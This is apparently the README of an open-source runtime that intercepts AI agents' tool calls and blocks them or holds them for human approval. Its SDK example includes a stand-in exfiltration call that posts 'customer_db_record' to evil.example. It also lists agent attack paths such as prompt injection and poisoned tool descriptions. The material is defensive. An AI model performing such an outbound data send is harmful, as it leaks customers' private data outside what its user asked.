# Aegotrax (runtime core)

Runtime protection for AI agents — checks tool calls before they run.

Public site: https://aegotrax.com

This repository contains the open pilot runtime (package name in code: `agentguard`).

---

# 🛡️ AgentGuard v0.2.4 — Hardened Pilot Runtime for AI Agents

Runtime protection for autonomous agents: **intercept tool calls**, evaluate **server-side intent + data provenance**, and **block or require human approval** before sensitive actions run.

Supports:
- **MCP Gateway** (stdio) for agent frameworks
- **Python SDK** for direct integration with your existing tools

### What’s new in 0.2.4
- **Human-approval queue**: `REQUIRE_APPROVAL` issues `approval_id` + `approval_token`; approve via `POST /approval/decide`; single-use resume on `/verify`
- (from 0.2.3) Server-side intent only, hostname allowlists, SSRF/IMDS guard, session TTL, rate limit, audit redaction, schema pinning

---

## Install

```bash
pip install .
# with LangGraph demo deps:
pip install ".[demo]"
```

Commands after install:

```bash
agentguard-engine     # Risk Engine → http://127.0.0.1:8000
agentguard-gateway    # MCP Gateway (stdio)
```

Health check: `curl http://127.0.0.1:8000/health`

---

## Pilot integration (SDK — recommended)

**Important:** with the default `AGENTGUARD_SERVER_INTENT_ONLY=true`, the engine
**ignores** `user_intent` on verify calls. Register intent once via
`set_session_context` (→ `POST /session`); that becomes the source of truth.

```python
from agentguard import verify_tool_call, set_session_context, protected_tool

# 1) Register user intent on the engine (server-side source of truth)
set_session_context(
    "sess-42",
    user_intent="Summarize the ticket only",
    agent_id="support-agent",
    user_id="user-123",  # optional tenant binding
)

# 2) Before every tool call
result = verify_tool_call(
    session_id="sess-42",
    agent_id="support-agent",
    user_intent="",  # ignored when SERVER_INTENT_ONLY=true
    tool="http_post",
    arguments={"url": "https://evil.example", "data": "customer_db_record"},
)

if result["decision"] == "BLOCK":
    raise PermissionError(result["reasons"])

if result["decision"] == "REQUIRE_APPROVAL":
    # Tool was NOT executed. Human must approve, then resume once:
    # POST /approval/decide {approval_id, token, decision: "approve"}
    # then:
    result = verify_tool_call(
        session_id="sess-42",
        agent_id="support-agent",
        tool="http_post",
        arguments={"url": "https://evil.example", "data": "customer_db_record"},
        approval_id=result["approval_id"],
        approval_token=result["approval_token"],
    )

# 3) Or decorate your real functions
@protected_tool(
    session_id_fn=lambda: "sess-42",
    agent_id_fn=lambda: "support-agent",
    user_intent_fn=lambda: "",  # not used by engine when server-intent-only
)
def send_email(to: str, body: str):
    ...
```

---

## Configuration (environment)

| Variable | Default | Purpose |
|----------|---------|---------|
| `AGENTGUARD_API_KEY` | — | If set, required as `X-API-Key` on engine APIs |
| `AGENTGUARD_REQUIRE_API_KEY` | `false` | If `true`, refuse requests when no key is configured |
| `AGENTGUARD_SERVER_INTENT_ONLY` | `true` | Ignore client `user_intent` on `/verify`; use `/session` only |
| `AGENTGUARD_SESSION_TTL` | `3600` | Session idle TTL in seconds (`0` = never expire) |
| `AGENTGUARD_RATE_LIMIT` | `120` | Max `/verify` calls per session per window |
| `AGENTGUARD_RATE_WINDOW` | `60` | Rate-limit window (seconds) |
| `AGENTGUARD_AUDIT_REDACT` | `true` | Redact sensitive keys in audit log arguments |
| `AGENTGUARD_APPROVAL_WEBHOOK` | — | POST when `REQUIRE_APPROVAL` (payload includes token) |
| `AGENTGUARD_APPROVAL_TTL` | `1800` | Pending approval lifetime (seconds) |
| `AGENTGUARD_AUDIT_WEBHOOK` | — | Stream every audit event (best-effort) |
| `AGENTGUARD_POLICY_PATH` | package policy | Custom `policy.yaml` |
| `AGENTGUARD_AUDIT_LOG` | `agentguard_audit.log` | Audit file path |
| `AGENTGUARD_MODE` | `simulate` | Gateway: `simulate` / `echo` / `forward` |
| `AGENTGUARD_FAIL_CLOSED` | `true` | Block when engine unreachable |
| `AGENTGUARD_HOST` / `PORT` | `127.0.0.1` / `8000` | Engine bind |
| `AGENTGUARD_ENGINE_URL` | `http://127.0.0.1:8000/verify-multi-agent` | SDK/gateway → engine |
| `AGENTGUARD_ENGINE_TIMEOUT` | `2.0` | Timeout (seconds) to engine |

Policy override order: `AGENTGUARD_POLICY_PATH` → `./policy.yaml` → package default.

**Shared / non-local hosts:** set a strong `AGENTGUARD_API_KEY` and
`AGENTGUARD_REQUIRE_API_KEY=1`. Never bind to `0.0.0.0` without both.

---

## Engine API (pilot)

| Method | Path | Description |
|--------|------|-------------|
| GET | `/health` | Liveness + hardening flags |
| POST | `/verify-multi-agent` | Main decision API |
| POST | `/session` | Set session intent (+ optional `user_id`) |
| POST | `/session/reset` | Clear session provenance |
| GET | `/session/{id}` | Inspect session |
| POST | `/policy/reload` | Reload policy (audited) without restart |
| POST | `/approval/decide` | Approve or deny a pending approval (`token` required) |
| GET | `/approval/{id}` | Approval status (token not exposed) |
| GET | `/approvals/pending` | List pending approvals (optional `?session_id=`) |

---

## Human approval queue (REQUIRE_APPROVAL)

When a call scores in the approval band (below block, at/above approval threshold):

1. Engine returns `decision=REQUIRE_APPROVAL` plus **`approval_id`** and **`approval_token`**
2. Operator (or webhook consumer) calls:
   ```http
   POST /approval/decide
   { "approval_id": "...", "token": "...", "decision": "approve" | "deny" }
   ```
3. Client re-issues the **same** tool + arguments with `approval_id` + `approval_token`
4. Token is **single-use** (consumed on ALLOW). Mismatch / reuse → BLOCK

Demo (engine must be running):

```bash
python examples/approval_flow_demo.py
```

---

## Threats covered

- Indirect prompt injection leading to tool abuse
- Data provenance / multi-hop exfiltration
- Intent constraint violations (“summarize only” → outbound)
- Dangerous script execution
- Poisoned MCP tool descriptions (schema pinning + drift detection)
- Client spoofing of `user_intent` (server-side intent)
- Substring allowlist bypasses on URLs/emails
- SSRF / cloud metadata (IMDS) targets
- Basic session flooding (rate limit)
- Unattended mid-risk actions (human approval queue)

---

## Schema pinning & drift detection (MCP)

A poisoned tool *description* can steer the agent before the tool-call interceptor
ever runs. AgentGuard pins tool schemas at registration and flags drift.

**Built-in gateway tools** are pinned automatically from canonical definitions at
startup. High-severity drift is blocked *before* the call reaches the risk engine.

**When you proxy upstream MCP servers**, pin schemas once on connect, then check
every subsequent `tools/list`:

```python
from agentguard.mcp_gateway import pin_upstream_tool, check_upstream_drift

for tool in upstream_tools:
    pin_upstream_tool(tool["name"], tool)

drift = check_upstream_drift(tool["name"], tool)
if drift and drift.severity == "high":
    # Do not expose this tool; log and alert
    ...
```

Introspection: MCP tool `schema_status` → JSON of pinned schemas + drift events.

---

## Security hardening (v0.2.4)

| Control | Default | Notes |
|---------|---------|-------|
| Server-side intent only | `AGENTGUARD_SERVER_INTENT_ONLY=true` | `/verify` ignores client `user_intent`; use `/session` |
| API key | optional | Set `AGENTGUARD_API_KEY` + `AGENTGUARD_REQUIRE_API_KEY=1` for shared hosts |
| Session TTL | 3600s | `AGENTGUARD_SESSION_TTL` (`0` = never expire) |
| Rate limit | 120 / 60s per session | `AGENTGUARD_RATE_LIMIT` / `AGENTGUARD_RATE_WINDOW` |
| Audit redaction | on | `AGENTGUARD_AUDIT_REDACT` |
| URL allowlist | hostname parse | no substring `in` bypasses |
| SSRF/IMDS guard | on | blocks private/link-local/metadata in engine + gateway |
| Email domain | exact/subdomain | rejects `user@company.com.evil.com` |
| Intent patterns | broader | `only`, `just summarize`, `do not send`, … |
| Schema pinning | on | MCP tool definition drift |
| REQUIRE_APPROVAL | **token queue** | `approval_id`+`token` → `/approval/decide` → single-use resume |

Offline checks:

```bash
python examples/security_hardening_test.py
python examples/schema_pinning_demo.py
```

With engine running:

```bash
python examples/approval_flow_demo.py
```

---

## Security notes (read before running)

This is a **local pilot / sandbox** runtime — not a full enterprise security control.

1. **Do not expose port 8000 to the internet.**  
   Prefer binding **127.0.0.1:8000** only. Do not use `0.0.0.0` unless you set a strong
   `AGENTGUARD_API_KEY` and `AGENTGUARD_REQUIRE_API_KEY=1`.

2. **Default gateway mode is `simulate`** (no real outbound HTTP from the demo gateway).  
   `AGENTGUARD_MODE=forward` plus `AGENTGUARD_ALLOW_REAL_HTTP=1` enables **real** HTTP POST
   and must only be used in an isolated lab. Private/IMDS destinations are still blocked.

3. **Policy is heuristic** (keywords, allowlists, score thresholds). It will not catch every
   attack or novel encoding. Tune `policy.yaml` (`trusted_hosts`, `trusted_domains`, thresholds)
   for your tools.

4. **Audit logs may still contain tool arguments.** With `AGENTGUARD_AUDIT_REDACT=true`
   (default), common secret keys are redacted; review before sharing logs.

5. Optional webhooks must be reachable public HTTP(S) endpoints; loopback and private network
   targets are rejected by the SSRF guard.

6. **REQUIRE_APPROVAL uses a token queue.** The tool is not executed until a human calls
   `POST /approval/decide` and the client re-submits with `approval_id` + `approval_token`
   (single-use). Optional webhook receives the pending item including the token.
   The queue is **in-memory** (cleared on process restart).

---

## License

Apache-2.0
